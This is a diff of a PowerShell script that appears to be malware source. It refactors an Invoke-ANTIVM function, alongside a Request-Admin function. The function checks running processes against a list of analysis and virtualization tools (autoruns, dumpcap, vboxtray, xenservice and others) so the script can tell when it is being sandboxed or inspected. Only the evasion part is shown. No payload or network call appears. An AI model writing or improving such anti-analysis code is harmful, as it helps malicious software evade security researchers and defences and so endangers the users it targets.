@@ -451,8 +451,7 @@ function Request-Admin {
 }
 
 function Invoke-ANTIVM {
-    function antivm {
-        return @(
+    $processnames= @(
             "autoruns",
             "autorunsc",
             "dumpcap",
@@ -498,9 +497,6 @@ function Invoke-ANTIVM {
             "vboxtray",
             "xenservice"
         )
-    }
-    
-    $processnames = antivm
     $detectedProcesses = $processnames | ForEach-Object {
         $processName = $_
         if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
